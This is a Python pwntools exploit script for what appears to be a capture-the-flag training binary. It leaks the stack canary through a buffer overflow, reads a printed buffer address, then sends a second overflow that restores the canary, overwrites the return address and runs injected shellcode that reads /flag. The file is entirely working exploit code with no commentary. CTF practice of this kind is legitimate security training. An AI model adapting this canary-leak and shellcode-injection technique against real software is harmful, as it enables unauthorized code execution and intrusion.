#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-4-0')

io = elf.process()

PAYLOAD = b'REPEAT' + (b'A' * 34) + b'\x24\x29\x21\x89\x52\x9b\x29\x5c' + b'A' * 6 + b"XYZ" 
io.sendline(f"{len(PAYLOAD)}".encode())
io.sendline(PAYLOAD)
io.recvuntil(b'XYZ')
cana = u64(io.recv(7).rjust(8, b'\x00'))
cana = p64(cana)
print(cana)



io.recvuntil(b"The input buffer begins at 0x")

buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))
print(buff_addr)

SHELLCODE = asm(shellcraft.cat('/flag'))
print(len(SHELLCODE))
PADDING = b'A'*(72-len(SHELLCODE))

buff_addr = u64(buff_addr) + 0x50
buff_addr = p64(buff_addr)
addr = struct.unpack('<Q', buff_addr[:8])[0]

print(hex(addr)) 
payload = b'A' * 40 + b"\x5c\x29\x9b\x52\x89\x21\x29\x24" + b'A' * 8 + cana + b'A' * 8 + buff_addr + SHELLCODE

io.sendline(f"{len(payload)}".encode())
io.sendline(payload)
io.interactive()
